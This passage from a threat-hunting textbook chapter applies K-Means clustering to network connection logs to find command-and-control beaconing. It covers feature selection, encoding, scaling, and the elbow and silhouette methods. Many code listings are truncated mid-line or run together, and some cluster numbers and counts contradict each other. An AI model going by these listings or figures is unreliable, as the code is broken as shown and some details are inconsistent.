Similar to Chapters 6 and 7, the DataFrame df contains columns representing the fields extracted from the original events: epoch_timestamp, host.name, app, src_ip, src_port, dest_port, dest_ip, bytes, bytes_in, bytes_out and @sourcetype.
Figure 8.2 Fields extracted from raw events stored in our datastore, Humio

Similar to Chapters 6 and 7, we keep the events of connections with a high count and then calculate new fields for these events. In addition to time_diff_msec, std1, var1, and count1, we calculate another field, bytes_diff, which is the difference between the outbound and inbound bytes in a connection.
Listing 8.3 Jupyter notebook code - Calculate new variables
count_threshold=100
df = df.groupby(['src_ip', 'dest_ip',  'dest_port']).filter(lambda df = df.reset_index()
 
df = df.sort_values(by=['epoch_timestamp'], ascending=True) df['epoch_timestamp'] = df['epoch_timestamp'].astype(int) df['epoch_endtime'] = df['epoch_endtime'].astype(int) df['bytes'] = df['bytes'].astype(int) df['bytes_in'] = df['bytes_in'].astype(int) df['bytes_out'] = df['bytes_out'].astype(int)
 
df['time_diff_msec'] = df.groupby(['src_ip', 'dest_ip', 'dest_port df['time_diff_sec'] = df['time_diff_msec'].div(1000)
 
df['date'] = pd.to_datetime(df['epoch_timestamp'],unit='ms')
 
df['std1'] = df.groupby(['src_ip', 'dest_ip', 'dest_port'])['time_ df['var1'] = df.groupby(['src_ip', 'dest_ip', 'dest_port'])['time_ df['count1'] = df.groupby(['src_ip', 'dest_ip', 'dest_port'])['tim df['bytes_diff'] = df['bytes_in'] - df['bytes_out']               
Listing 8.4 shows that we now have 159488 rows and 21 columns in df. Not all the columns in df would eventually translate to useful features.
Listing 8.4 Jupyter notebook code - Return the dominions of df
df.shape                                                          (159488, 21)                                                      
Note
As we go through the next sections, the terms field, column, and feature refer to the same thing. A column in a Pandas DataFrame represents a feature extracted or calculated from fields in raw data we imported from our datastore. We will use these three terms (field, column, and features) interchangeably.
Now that we have our dataset in DataFrame df, it is time to extract and calculate useful features to create our first ML model.
8.1.3 Exploring and processing the dataset
We do not have to use all the fields in a dataset as features. In practice, using many features doesn't translate to better ML performance. We can start by selecting ones that could be relevant to our scenario based on what we have seen from the previous two chapters.
In Listing 8.5 we assign columns of interest to a new DataFrame, df_features.
Listing 8.5 Jupyter notebook code - Store features in a new DataFrame, df_features
df_features = df[['bytes', 'app', 'std1', 'bytes_diff', 'count1']]
Before we apply ML, we need to examine the dataset to look for the following:
1. Columns (fields) containing a large number of empty cells. Such fields will not help us draw differences, so we can drop them
2. Columns (fields) containing a large number of unique values. Such fields will not help us draw similarities, so we can drop them
3. Highly correlated fields. We can keep one to represent them and drop
the rest
4. Depending on which ML models we plan to use, we need to find and convert strings into numerical values
Let us review our dataset by going through the above checklist.
8.1.4 Looking for empty fields
The code in Listing 8.6 counts the number of empty cells for every column in DataFrame df_features.
Listing 8.6 Jupyter notebook code - Return the number of empty cells per column
df_features.isnull().sum()                                        
 
bytes         0 app           0 std1          0 bytes_diff    0 count1        0
The output shows that we do not have fields with empty cells, so we can move on and look for fields with many unique values.
8.1.5 Looking for fields with a large number of unique values
Listing 8.7 Jupyter notebook code - Return the number of empty cells per column
df_features.nunique()                                             
 
bytes         764 app            11 std1           64 bytes_diff    738 count1         42
Compared to the dataset size, 159488 rows, the output shows that the potential features have a relatively small number of unique values. Hence, we will keep all the columns and move on to find if there are highly correlated fields.
8.1.6 Looking for highly correlated fields
We use a color-coded heatmap to visualize the correlations between the features in df_features. We use Seaborn, a data visualization library, to generate the heatmap.
Note
Feature selection is critical in ML and can significantly impact the ML model's performance.
We use the default correlation method, Pearson, which measures the relationship strength between two variables. The method produces a correlation score that ranges from -1 to 1. A score closer to 1 indicates a stronger correlation, while a score closer to -1 indicates a stronger negative correlation between the variables. If two variables, x and y, are positively correlated, then if variable x goes up, y will also go up. On the other hand, if they are negatively correlated, then if variable x goes up, variable y will go down.
There is a small issue to address first before we can correlate the fields. Calculating the correlation level requires numeric fields. In our dataset, all fields but, app, are numeric. We need to convert the strings in the field app to numerical values, which we can use for correlation and other purposes. We have eleven (11) unique values (also referred to as categories) in field app. The eleven (11) unique values in field app are independent; there are no ordering or hierarchy relationships between the eleven (11) values.
8.1.7 Converting non-numerical fields to numerical
Different techniques can convert string variables into numerical ones. Two widely used techniques are Label Encoding and One Hot Encoding.
Label encoding
Label Encoding is a simple process that converts each value in a column into a number. Numerical values will range between 0 and total_categories -1 , where total_categories is the total number of unique values in a field. According to Listing 8.7, we have eleven (11) unique values (also referred to as categories) in field (column) app; hence, we expect the encoded label values to be from 0 to 10. The eleven (11) unique values in field app are independent; there are no ordering or hierarchal relationships between the values.
The code in Listing 8.8 shows how to apply a Pandas category coding function to column app in DataFrame df_features_label_enc.
Listing 8.8 Jupyter notebook code - Label Encoding for field app
df_features_label_enc = df_features[['bytes', 'app',  'std1', 'byt df_features_label_enc['app_cat'] = \ df_features_label_enc["app"]. df_features_label_enc.head()                                      
The output in Figure 8.3 shows a new column, app_cat, containing numerical values mapped to the values in app.
Figure 8.3 The first five (5) rows of df_features_label_enc showing field app_cat containing the labels assigned to the values in app

IMPORTANT
One side effect of Label Encoding, when used to encode independent values, is that it can lead to priority issues in a dataset. Some ML algorithms might give higher priority to labels assigned higher values.
The encoding in column app_cat in Figure 8.3 introduces a sort of relationship that does not exist in the original categories. For example, the code for category windows_azure (10) is higher than the code assigned to category ssl (5). To overcome this problem, we can use One Hot Encoding, a preferred technique when encoding is required and when the categorical data do not have any order (also referred to as nominal).
One hot encoding
One Hot Encoding converts a non-numeric column to n columns containing 1s and 0s, where n is the number of unique values in the original column. For example, applying One Hot Encoding to field app will create eleven (11) new columns and set the values to 0s or 1s, which correspond to the eleven (11) unique values in app. In Listing 8.9, we use the Pandas get_dummies to implement One Hot Encoding on column app.
Listing 8.9 Jupyter notebook code - Applying One Hot Encoding on field app
df_features_one_hot_enc = pd.get_dummies(df_features, columns=['ap list(df_features_one_hot_enc)                                     
The output in Listing 8.10 shows eleven (11) new columns that start with app_, corresponding to the eleven (11) unique values in the original field app, which was dropped automatically from df_features_one_hot_enc.
Listing 8.10 Jupyter notebook code - List of all column names in df_features_one_hot_enc
['bytes',
 'std1',
 'bytes_diff',
 'count1',
 'app_dns',
 'app_dropbox',
 'app_http',
 'app_rpc',
 'app_splunk',
 'app_ssl',
 'app_tcp',
 'app_udp',
 'app_unknown',
 'app_unknown-ssl',
 'app_windows_azure']
IMPORTANT
One drawback of One Hot Encoding is that it creates as many new columns, each presenting a new feature, as there are unique values in the original categorical variable. In our case, we had eleven unique values (11), which is manageable. What if we had a much larger number, let us say 100? It would require more time to build ML models when working with datasets with a very large number of features. A problem that Is referred to as the curse of dimensionality.
When applying One Hot Encoding results in a large number of features, we
can consider using dimension reduction techniques such as Principal Component Analysis (PCA) and autoencoding.
In our case, the total number of features after applying One Hot Encoding is still manageable: fifteen (so far) based on the output in Listing 8.10; hence, we will not deploy a dimension reduction method.
With a numeric-only dataset generated by the code in Listing 8.9, we are now ready to calculate the correlation scores and generate the correlation heatmap.
8.1.8 Calculating correlation
We start by generating a pairwise correlation heatmap that contains the correlation score.
Listing 8.11 Jupyter notebook code - Generate the pairwise correlation heat map for the df_features_one_hot_enc
import matplotlib.pyplot as plt                                   import seaborn as sns                                             
 
plt.figure(figsize=(16,9))                                        sns.heatmap(df_features_one_hot_enc.corr (method='pearson'), annot
The output of executing the code is the pairwise correlation heatmap, shown in figure 8.4.
Figure 8.4 Heatmap showing the pairwise correlation of fields in df_features_one_hot_enc

Fields in df_features_one_hot_enc with numerical values represent the rows and columns of the heatmap. The scores and color codes represent the correlation score. For example, the heatmap shows that the correlation between bytes and bytes_diff is relatively high. A correlation score of 0.75 indicates that a significant positive relationship exists between the two variables. When the value of bytes goes up or down, then the value of bytes_diff follows the same trajectory. Since the two variables are highly correlated, we can keep one and drop the other. Let us keep the original field bytes and drop the calculated one, bytes_diff.
The heatmap also shows a strong correlation between app_splunk and bytes, and between app_unknown and count1. We will drop columns app_splunk and app_unknown.
Listing 8.12 Jupyter notebook code - Drop highly correlated fields
df_features_one_hot_enc = df_ features_one_hot_enc.drop(['bytes_di plt.figure(figsize=(16,9)) sns.heatmap(df_features_one_hot_enc.corr (method='pearson'), annot
Figure 8.5 shows the heatmap after dropping columns bytes_diff, app_splunk, and app_unknown. The updated heatmap contains the correlation scores between the remaining twelve (12) features.
Figure 8.5 Heatmap after dropping column bytes_diff, app_splunk, and app_unknown

So far, we have not done core ML work. For example, we didn't introduce new ML algorithms, create models, or apply models. All that we have done so far is that we've uploaded, explored, and prepared the data for ML. What we have done so far is referred to as data engineering.
Important
Don't underestimate the role of a data engineer in any ML project. As a threat hunter, you are expected to understand the process and work with a data engineer to prepare the data. There will be cases where data exploration and preparation tasks are simple enough for a threat hunter to perform. There are also cases in which threat hunters have built knowledge and experience to carry out a large portion of ML work, including data engineering.
We use unsupervised ML in our threat hunting expedition. Unsupervised ML refers to using mathematics to identify patterns in unlabeled (also referred to as untagged) datasets.
Unlabeled refers to not having prior knowledge about the mapping of data points to some pre-defined labels. For example, we do not inform an unsupervised ML whether an event in a dataset is malicious or benign.
IMPORTANT
The ability to discover similarities and differences in data makes Unsupervised ML a good choice for exploratory data analysis, which translates to threat hunting expeditions. In our case, we will use unsupervised ML to uncover anomalies.
With the latest dataset, df_features_one_hot_enc, almost ready for ML, it is time to introduce our first ML algorithm, K-Means. In the next section, we use K-Means to uncover hidden anomalies that can help us identify potential threats relating to the hypothesis: an adversary was able to take control of one or more internal hosts, which then started to beacon with jitter added to a C2 server using any TCP or UDP port. We do not know the time interval between the call-home connections or the percentage of jitter added.
8.2 K-Means clustering
K-Means is a clustering-based unsupervised ML algorithm. K-Means groups objects (data points) into pre-defined k groups (clusters).
Note
Think of a data point as a representation of a row in our dataset, df_features_one_hot_enc containing twelve (12) Features (so far).
Data points sharing some form of similarity belong to a cluster. In K-Means, this similarity is based on how close they are to the center of a cluster. KMeans tries to find the optimal cluster centers, which we refer to as centroids.
Definition
A centroid is the arithmetic mean of data points assigned to the cluster and represents the center of a cluster.
8.2.1 How does K-Means work?
K-Means is a simple, still powerful, unsupervised ML that relies on assigning data points to k centroids. Every data point in a dataset is part of a cluster whose centroid is most closely located.
Note
K-Means is a distance-based algorithm in which we calculate the distances to assign a data point to a cluster.
How does K-Means decide on the centroids? K-Means runs an iterative process to find the optimal centroids. In the first iteration, K-Means assign random k centroids and then perform two steps:
1. Assign each data point to the closest corresponding centroid using the straight-line distance between the data point and the centroid (referred to as the standard Euclidean distance.)
2. Compute the centroids by taking the mean of all data points that belong to each cluster
Repeat steps one (1) and two (2) until there is no change in the centroids, meaning that the optimal centroids are found or until the process stops based on a previously determined maximum number of steps.
We mentioned earlier that we are almost done with preparing our dataset. The reason for almost is that K-Means requires us to do one final processing task: feature scaling.
K-Means, and other ML algorithms, are impacted by the magnitude of the features. For example, in our dataset, df_features_one_hot_enc, we have features such as app_http with values of 0 or 1 and others such as bytes in thousands. K-Means will be biased toward variables with higher magnitudes, impacting the model's performance.
We should bring down all the variables to the same scale to overcome this problem. Feature scaling allows us to normalize the range of independent features.
8.2.2 Feature scaling
Feature scaling (also referred to as data normalization), is critical for ML algorithms that calculate distances between data points. K-Means is one of these algorithms. A data point is a row in our DataFrame containing multiple features. Mathematically, how does K-Means calculate the distance between two data points, i.e., two rows? Let us take a simple example that demonstrates how distance is calculated and the impact of feature magnitude.
Let us take two data points in a dataset, x and y, each having three (3) columns (numerical features): x = (x1, x2, x3) and y = (y1, y2, y3).
The distance between x and y is calculated as follows:
Assume x = (4000, 2, 0.9) and y = (3100, 2.8, 1.5). The distance between x and y is calculated as follows:

We can see the large impact of having features with large magnitude differences. We can visualize the distance between the two data points, x and y, using the 3-D plot in Figure 8.6.
Figure 8.6 3-D plot showing the distance between data points x and y

There are a number of methods to scale features. We use Standard Scaler, which scales each feature, so it has a mean of 0 and a standard deviation of 1.
Listing 8.13 Jupyter notebook code - Scaling the features in df_features_one_hot_enc
from sklearn.preprocessing import StandardScaler                  
 
scaler = StandardScaler()                                         df_features_one_hot_enc['bytes'] =  scaler.fit_transform(df_featur df_features_one_hot_enc['std1'] =  scaler.fit_transform(df_feature df_features_one_hot_enc['count1'] =  scaler.fit_transform(df_featu df_features_one_hot_enc_enc.head()
Figure 8.7 shows a snapshot of values in df_features_one_hot_enc after applying feature scaling.
Figure 8.7 The values of df_features_one_hot_enc after feature scaling

Note
Although the values are transformed, applying Standard Scaler on a dataset does not change the distribution (i.e., the shape) of the data.
Some good news, scaling the features was our last data processing task. It is time to apply K-Means, starting with identifying the optimal value of k, the number of clusters.
8.2.3 Determining the number of clusters, k
A critical input to K-Means is the value of k, the number of clusters the algorithm should try to identify from the data. Deciding on the number of clusters can be tricky. Domain knowledge might allow us to come up with a value for k. However, in many cases, we do not know how many groups (clusters) are in the dataset, so how can we find the optimal value of k?
Let us start by looking at how our data points look using pairwise plots. If we are lucky, a visual output might give us some clues. Selecting all the features will result in a large pairwise plot that cannot be adequately presented here.
Therefore, we select a few features to plot for demonstration purposes.
Listing 8.14 Jupyter notebook code - Generate pairwise plots for the columns (features) in df_features_one_hot_enc
sns.pairplot(df_features_one_hot_enc, vars=['bytes', 'std1', 'coun plt.show()
Executing the code in Listing 8.14 generates the pairwise plots in Figure 8.8.
Figure 8.8 Pairwise plots for the columns (features) in df_features_one_hot_enc



The plots in Figure 8.8 give us an idea of the distribution; however they are not of great help. They don't help us identify the potential number of groups
(clusters) in our dataset, df_features_one_hot_enc. We can't rely only on visualization; we need a systematic method to estimate the optimal number of clusters in the data.
Note
In ML courses, you will probably use datasets that generate plots with neatly distributed data points, similar to the plot in Figure 8.8, from which you can easily infer the number. However, in practice, you will often encounter datasets you cannot draw clusters from by simply visualizing them using plots; you should be prepared to process the dataset using mathematics.
Figure 8.9 Sample dataset with distribution clearly showing five (5) groups (clusters)


Applying methods, such as the elbow method and silhouette analysis, to data can help determine the optimal number of clusters in the dataset. In our case, we use the elbow method, a popular method to estimate the value k. Running the elbow method would generate a plot. The optimal value of k would be the place of the elbow shape.
The elbow method relies on running K-Means for different values of k (e.g., two (2) to nine (9)) and calculating the sum of square errors (SSE), also referred to as the distortion score, from each point to its assigned center for every value of k. We then plot the value of SSE versus k to find the point in the plot where an elbow bend appears.
Note
The elbow is the point in the plot where the distortion score value does reduce much, after declining fast for previous values of k.
To demonstrate what an elbow looks like, the sample plot in Figure 8.10 shows the bend (elbow) at k = 5, after which the value of the distortion score does not reduce much, compared to the previous values of k (2, 3, and 4).
Figure 8.10 Sample elbow method plot

In Figure 8.10, the x-axis shows the number of clusters, k, and the y-axis shows the distortion score (SSE).
Note
Expect to encounter cases in which visually finding the elbow point is not as straightforward as the one in Figure 8.9.
Let us run the elbow method on our data to find the elbow point. To abstract the elbow method encoding, we use the YellowBricks ML visualization library (https://www.scikit-yb.org) The library allows you to generate an elbow plot and automatically locate the value of k. For locating the elbow, YellowBricks implements the algorithm described in the "Knee point detection in Python" whitepaper (https://github.com/arvkevi/kneed).
Listing 8.15 Jupyter notebook code - Apply the elbow method to df_features_one_hot_enc
from yellowbrick.cluster import KElbowVisualizer                  from sklearn.cluster import KMeans                                
 
model = KMeans()                                                  visualizer = KElbowVisualizer(model, k=(2,10))                    visualizer.fit(df_features_one_hot_enc)                           visualizer.show()                                                 Running the code in Listing 8.15 generates the plot and values in Figure 8.11.
Figure 8.11 Elbow method plot showing the elbow at k = 4


From the solid line in the plot and the annotation added on top, the elbow is at k = 4, indicating that the optimal value of k for our dataset is most probably
4. Although the KElbowVisualizer code selected k = 4 as the elbow point, visually, it does not show in an obvious way. The dashed line represents the time it took to build the model for every value of k. We will go ahead with the number suggested by the YellowBricks, while keeping in mind that other values of k of > 4 (e.g., 6 and 8) might still be applicable.
Now that we've identified a value for k let us apply K-Means with k = 4.
8.2.4 Applying K-Means clustering
K-Means is a centroid-based or distance-based algorithm in which we calculate the distances to assign a point to a cluster. The main objective of the K-Means is to minimize the sum of distances between the data points in a cluster and their respective cluster centroid.
Note
K-Means is sensitive to outliers because it uses the mean in its calculation.
We will not write the code of K-Means, but rather use a black box implementation available in the Scikit-learn, sklearn, library (https://scikitlearn.org). Scikit-learn is a free ML library for Python. The code in Listing 8.16 shows how we apply K-Means to our dataset to create a model.
Listing 8.16 Jupyter notebook code - Apply K-Means on df_features_one_hot_enc
from sklearn.cluster import KMeans                                
 
km = KMeans(n_clusters = 4)                                       km.fit(df_features_one_hot_enc)                                   df_features_one_hot_enc['cluster'] = km.labels_                   df_features_one_hot_enc.head()
In the context of K-Means, the model maps every data point in df_features_one_hot_enc to one of the k clusters (0 to k-1). Every row will now have a label containing a cluster number assigned by K-Means. A snapshot is shown in Figure 8.12.
Figure 8.12 Cluster labels assigned to each data point

The output in Figure 8.12 shows that K-Means assigned the first, second, third, and fourth data points in df_features_one_hot_enc to cluster one (1) and assigned the fifth data point to cluster three (3).
Let us visualize the clusters using a 2-D plot with two variables: bytes and std1.
Listing 8.17 Jupyter notebook code - Plot clusters using features bytes and std1
sns.lmplot(data=df_features_one_hot_enc,  x='bytes', y='std1', \ h
Figure 8.13 Clusters plotted for features bytes and std1

We can also plot the cluster mappings for other variables to demonstrate the distribution of data points. Figure 8.14 shows the cluster mapping for variables bytes and app_dropbox.
Figure 8.14 Clusters plotted for features bytes and app_dropbox

Let us count and plot the number of data points in each cluster using a histogram.
Listing 8.18 Jupyter notebook code - Count and plot the number of data points in each cluster
sns.countplot(df_features_one_hot_enc['cluster'])                 
Executing the code in Listing 8.18 generates the plot in Figure 8.15.
Figure 8.15 Number of data points in each cluster (k=4)

Let us get the exact count for each cluster.
Listing 8.19 Jupyter notebook code - Count the number of data points in each cluster
df_features_one_hot_enc.value_counts('cluster')
Executing the code in Listing 8.19 generates the following output.
Listing 8.20 Jupyter notebook output - The number of data points in each cluster
0 110085
1 45792
2 1833
3 1778
The everyday (normal) traffic events in a regular environment should represent most events. We would typically analyze data points associated with smaller clusters, which could represent hidden characters in a dataset. Before we do that, let us compare the size of each cluster using a per chart.
Listing 8.21 Jupyter notebook output - Display a pie chart showing the size of the clusters in percentage
plt.pie(df_features_one_hot_enc.value_counts ('cluster'), colors = plt.show()
Executing the code in Listing 8.21 generates the plot in Figure 8.15.
Figure 8.16 The size of each cluster in percentage (k=4)


From the pie chart: cluster two (2) represents 1.15% of the dataset and cluster three (3) represents 1.11% of the dataset.
Note
Grouping the data points into four (4) clusters doesn't answer the hypothesis. It doesn't tag data points as malicious or benign. It is the threat hunter job to determine why data points were grouped in a cluster.
Now that we applied K-Means and identified four (4) clusters let us analyze the small ones to uncover anomalies of interest if any exist.
8.3 Analyzing clusters of interest
We have three datasets: df_features_one_hot_enc, df_features or df. Which dataset should we analyze? We need access to the original content of fields, such as the source and destination IP addresses, in addition to the cluster mapping.
The df_features_one_hot_enc dataset, which contains the cluster mapping, has transformed the original values we extracted from df_features so that we don't have the original content to analyze.
We will go back to the original DataFrame, df, create a new column, let us call it cluster, and copy the cluster column from
df_features_one_hot_enc into the new column. This is done using a simple line of code, shown in Listing 8.22.
Listing 8.22 Jupyter notebook output - Copy the content of column from df_features_one_hot_enc to a new column, cluster, in df
df['cluster'] = df_features_one_hot_enc['cluster']
Now that we have the original dataset with labels added, the cluster numbers, let us look into the two small clusters: three (3) and two (2). We start by looking into the smallest one, cluster three (3). The small clusters contain events that somehow differ from most events, i.e., the small clusters contain anomalous connection events based on the features we supplied to K-Means. Anomalous does not mean malicious; it only indicates that they are different. It is our job as hunters to find whether the connection events mapped to these clusters are malicious or benign.
8.3.1 Cluster three (3)
We start with the smallest cluster, cluster three (3). The cluster contains 1778 data points, which translates to 1778 rows in the DataFrame, df. What should we look for when analyzing each cluster?
We should look for signs relevant to our hypothesis: beaconing to a C2 server using any TCP or UDP port. Let us generate a summary of field values that could be shared between multiple events: src_ip, dest_ip, dest_port, std1, and count1. We will borrow the search from Chapter 7, which excludes connections we know are normal traffic based on IP addresses and ports.
Listing 8.23 Jupyter notebook code - Exclude normal traffic by destination port and IP addresses for cluster three (3)
df[
    (df.cluster == 3) \
    & (df['src_ip'].str.startswith("10.")) \
    & (df['dest_port'] != "9997") \
    & (~df['dest_ip'].str.endswith(".255")) \
    & (~df['dest_ip'].str.contains("20.7.1")) \
    & (~df['dest_ip'].str.contains("20.7.2")) \
    & (~df['dest_ip'].str.contains("20.10.31.115")) \
    & (~df['dest_ip'].str.contains("168.63.129.16")) \
    & (~df['dest_ip'].str.contains("169.254.169.254")) \
    & (~df['dest_ip'].str.contains("239.255.255.250")) \ ].groupby(['src_ip', 'dest_ip', 'dest_port', 'std1', \ 'count1']).
Executing the code in Listing 8.23 returns a list of connections we should investigate further.
Listing 8.24 Jupyter notebook output - Remaining connections in cluster three (3) to investigate
src_ip     dest_ip       dest_port  std1        count1    count 10.0.0.4   162.125.2.14  443        318.035964  188       1
Only one connection event is left after excluding the known normal traffic. Although it is a single connection, field count1 shows that there are 188 connections in total that share the same src_ip, dest_ip, and dest_port. Where are the remaining connections (events)? They must be in other clusters, so let us move to cluster four (2).
8.3.2 Cluster two (2)
Cluster two (2) contains 1833 connection events. We will perform a similar search to the one we executed for cluster three (3).
Listing 8.25 Jupyter notebook code - Exclude normal traffic by destination port and IP addresses for cluster two (2)
df[
    (df.cluster == 2) \
    & (df['src_ip'].str.startswith("10.")) \
    & (df['dest_port'] != "9997") \
    & (~df['dest_ip'].str.endswith(".255")) \
    & (~df['dest_ip'].str.contains("20.7.1")) \
    & (~df['dest_ip'].str.contains("20.7.2")) \
    & (~df['dest_ip'].str.contains("20.10.31.115")) \
    & (~df['dest_ip'].str.contains("168.63.129.16")) \
    & (~df['dest_ip'].str.contains("169.254.169.254")) \
    & (~df['dest_ip'].str.contains("239.255.255.250")) \
].groupby(['src_ip', 'dest_ip', 'dest_port', 'std1', 'count1']).si
Executing the code in Listing 8.24 returns a list of connections we should investigate further
Listing 8.26 Jupyter notebook output - Remaining connections in cluster two (2) to investigate
src_ip     dest_ip       dest_port  std1        count1    count 10.0.0.12  40.87.160.0   23456      206.455235  201       202 10.0.0.13  40.87.160.0   23456      230.178827  168       169 10.0.0.15  40.87.160.0   23456      208.025854  194       195 10.0.0.16  40.87.160.0   23456      277.242684  157       158 10.0.0.18  162.125.2.14  443        260.311110  237       238            40.87.160.0   23456      211.466301  197       198 10.0.0.4   162.125.2.14  443        318.035964  188       188            40.87.160.0   23456      319.856596  147       148 10.0.0.8   40.87.160.0   23456      200.107996  164       165
10.0.0.9   40.87.160.0   23456      206.301193  171       172
Listing 8.25 shows a similar list of source and destination IP addresses to the one we uncovered in Chapter 7. The output shows multiple internal IP addresses communicating with 40.87.160.0 using port 23456, which we investigated in the "Interrogating the second suspect, 40.87.160.0" section in Chapter 7 and found out that it is a false alarm, due to issues with the technology (Splunk Stream) reporting the events.
Adding 40.87.160.0 to the exclusion list generates the output in Listing 8.27.
Listing 8.27 Jupyter notebook output - Remaining connections in cluster four (4) to investigate after adding 40.87.160.0 to the exclusion list
src_ip     dest_ip       dest_port  std1        count1    count 10.0.0.18  162.125.2.14  443        260.311110  237       238
10.0.0.4   162.125.2.14  443        318.035964  188       188
Bingo! Cluster two (2) contained the malicious connections from both internal hosts, 10.0.0.4 and 10.0.0.18, to the Box IP address,
162.125.2.14. We investigated these connections in Chapter 7 and found them malicious. Please refer to Chapter 7 for more information about the investigation work.
Finding the malicious connections should not stop us from analyzing the last cluster, two (2).
Let us summarize what we have done so far; we used K-Means to assign the
159488 data points in our dataset, df, to four (4) clusters. By analyzing the two small clusters, we uncover the malicious beaconing activities without relying on statistical thresholds (e.g., specifying a standard deviation threshold) or working on a subset of the data (e.g., using IQR). Processing the data and then applying unsupervised ML with K-Means did the trick.
In general, clustering algorithms are imperfect. In our case, K-Means mapped the malicious connections to multiple clusters, with the majority of the connections mapped to one of the two small clusters. Despite being imperfect, we can still use them to uncover anomalies.
We used the elbow method to decide the number of clusters, k, required for K-Means. We mentioned that there are other methods, such as silhouette analysis which can also help us identify the optimal value of k. Let us review silhouette analysis and find out if it would propose the same value of k.
8.4 Silhouette analysis as an alternative to the elbow method
Earlier in the chapter, we used the elbow method to determine the potential value of k. Silhouette is another method that can help you find the optimal value of k when applying K-Means to a dataset. We can use silhouette analysis to confirm the number of clusters suggested by the elbow method. Silhouette is also helpful in cases where identifying the elbow point is not clear enough. Silhouette uses the following to evaluate the clustering performance:
The denser the data points in a cluster, the better. The further apart each cluster is, the better.
The silhouette score (also referred to as silhouette coefficient) is calculated for each data point and is composed of two scores:
1. The mean distance between a data point and all other points in the same cluster (intra-cluster): a
2. The mean distance between a data point and all other points in the nearest cluster (inter-cluster): b
The silhouette coefficient for a data point is calculated as (b - a) / max(a, b). The silhouette coefficient for a dataset is the mean of the silhouette coefficients for the data points.
Silhouette coefficient ranges from -1 to 1. Values closer to 1 indicate that the data point is far away from the neighboring clusters, while values closer to -1 indicate that the data point might have been assigned to the wrong cluster. In general, the score would be higher when clusters are dense and well separated.
With this short introduction to silhouette, let us generate an analysis plot for different values of k. Similar to how we generated the elbow method plot, we use the YellowBricks ML visualization library.
Listing 8.28 Jupyter notebook code - Apply silhouette analysis to df_features_one_hot_enc
model = KMeans(random_state=1)
visualizer = KElbowVisualizer(model, k=(2,10), metric='silhouette' visualizer.fit(df_features_one_hot_enc) visualizer.show()
Executing the code in Listing 8.28 generate the plot in Figure 8.17. The xaxis represents the number of clusters, k, and the y-axis represents the silhouette score for every k.
Figure 8.17 Silhouette analysis plot showing eight (8) as the optimal value for k

According to Figure 8.16, executing the KElbowVisualizer code with metric set to silhouette shows that eight (8) would be the optimal value of k. This differs from the value of k suggested earlier by the elbow method. Figure 8.16 also shows that the silhouette scores are high for the different values of k: much higher than zero (0) and close to one (1), making them good candidates. We can see relative jumps (gain) in the score from k=2 to k=3, k =3 to k=4, k=5 to k=6, and k=8 to k=8.
IMPORTANT
The elbow method discussed earlier in the chapter relies on calculating the intra-cluster distances for scoring, while silhouette uses both, intra- and intercluster distances. Therefore, there will be cases in which the two methods might suggest different values of k.
Note
Both methods provide valuable information for clustering analysis; the elbow method is faster to execute, while silhouette analysis yields, in general, a better recommendation for the value of k.
For the sake of completeness, let us apply K-Means using two other values of k: six (6) and eight (8).
8.5 K-Means with k=6
In Listing 8.29 we first drop column cluster, containing the previously assigned cluster numbers from DataFrame df_features_one_hot_enc. We set the value of k to six (6) before applying K-Means. We then visualize the clusters using a count plot.
Listing 8.29 Jupyter notebook code - Apply K-Means on df_features_one_hot_enc with k=6
df_features_one_hot_enc =  df_features_one_hot_enc.drop(['cluster'
 
km = KMeans(n_clusters = 6) km.fit(df_features_one_hot_enc)
df_features_one_hot_enc['cluster'] = km.labels_ df_features_one_hot_enc.head()
 
ax = sns.countplot(df_features_one_hot_enc['cluster']) for container in ax.containers:     ax.bar_label(container)
Figure 8.18 Number of data points in each cluster (k=6)

Figure 8.18 Shows the number of data points in each of the six (6) clusters. We have three (3) small clusters that would interest us: one (1), five (5), and three (3). Cluster four (4), containing 5516 data points could be analyzed later. Let us have a quick look at three small clusters, starting with cluster one (1)
Cluster one
Cluster one (1) contains 227 connection events.
Listing 8.30 Jupyter notebook code - Exclude normal traffic by destination port and IP addresses for cluster one (1)
df[
    (df.cluster == 1) \
    & (df['src_ip'].str.startswith("10.")) \
    & (df['dest_port'] != "9997") \
    & (~df['dest_ip'].str.endswith(".255")) \
    & (~df['dest_ip'].str.contains("20.7.1")) \
    & (~df['dest_ip'].str.contains("20.7.2")) \
    & (~df['dest_ip'].str.contains("20.10.31.115")) \
    & (~df['dest_ip'].str.contains("168.63.129.16")) \
    & (~df['dest_ip'].str.contains("169.254.169.254")) \
    & (~df['dest_ip'].str.contains("239.255.255.250")) \
    & (~df['dest_ip'].str.contains("40.87.160.0")) \
].groupby(['src_ip', 'dest_ip', 'dest_port', 'std1', 'count1']).si Executing the code in Listing 8.30 returns the output shown in Listing 8.31.
Listing 8.31 Jupyter notebook output - Remaining connections in cluster one (1) to investigate
src_ip     dest_ip       dest_port  std1        count1  count 10.0.0.4  162.125.2.14  443        318.035964  188     71299    1
Only one connection (event) is left after excluding the known normal traffic. This is the same output we have seen in Listing 8.24. Let us move to cluster five (5).
Cluster five
Cluster five (5) contains 1551 connection events.
Listing 8.32 Jupyter notebook code - Exclude normal traffic by destination port and IP addresses for cluster five (5)
df[
    (df.cluster == 5) \
    & (df['src_ip'].str.startswith("10.")) \
    & (df['dest_port'] != "9997") \
    & (~df['dest_ip'].str.endswith(".255")) \
    & (~df['dest_ip'].str.contains("20.7.1")) \
    & (~df['dest_ip'].str.contains("20.7.2")) \
    & (~df['dest_ip'].str.contains("20.10.31.115")) \
    & (~df['dest_ip'].str.contains("168.63.129.16")) \
    & (~df['dest_ip'].str.contains("169.254.169.254")) \
    & (~df['dest_ip'].str.contains("239.255.255.250")) \
    & (~df['dest_ip'].str.contains("40.87.160.0")) \
].groupby(['src_ip', 'dest_ip', 'dest_port', 'std1', 'count1']).si
Executing the code in Listing 8.32 does not return any connection events. Time to look into cluster three (3).
Cluster three
Cluster three (3) contains 1883 connection events. Interestingly, this is the same number of connection events in one of the small clusters we analyzed with k=4 earlier and which contained the remaining malicious connections. You can refer to Listing 8.20, showing the number of data points per cluster for k=4.
Listing 8.33 Jupyter notebook code - Exclude normal traffic by destination port and IP addresses for cluster one (1)
df[
    (df.cluster == 1) \
    & (df['src_ip'].str.startswith("10.")) \
    & (df['dest_port'] != "9997") \
    & (~df['dest_ip'].str.endswith(".255")) \
    & (~df['dest_ip'].str.contains("20.7.1")) \
    & (~df['dest_ip'].str.contains("20.7.2")) \
    & (~df['dest_ip'].str.contains("20.10.31.115")) \
    & (~df['dest_ip'].str.contains("168.63.129.16")) \
    & (~df['dest_ip'].str.contains("169.254.169.254")) \
